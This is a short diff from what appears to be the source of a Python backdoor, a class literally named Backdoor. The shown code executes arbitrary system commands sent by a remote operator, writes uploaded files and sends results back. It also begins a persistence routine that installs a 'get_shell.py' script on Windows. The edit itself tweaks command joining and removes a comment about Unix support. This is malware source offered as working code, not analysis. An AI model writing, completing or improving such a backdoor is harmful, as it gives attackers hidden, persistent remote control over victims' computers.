@@ -101,14 +101,13 @@ class Backdoor:
 				elif command[0] == "upload":
 					command_result = self.write_file(command[1], " ".join(command[2:]))
 				else:
-					command_result = self.execute_system_command(command)
+					command_result = self.execute_system_command(" ".join(command))
 			except Exception:
 				command_result = "[-] Error during command execution."
 
 			print(command_result)
 			self.reliable_send(command_result)
 
-### only for Windows, Unix inc soon ###
 def persistence():
 	if os.name == 'nt':
 		script_path = "C:\\Users\\$PATH\\get_shell.py"
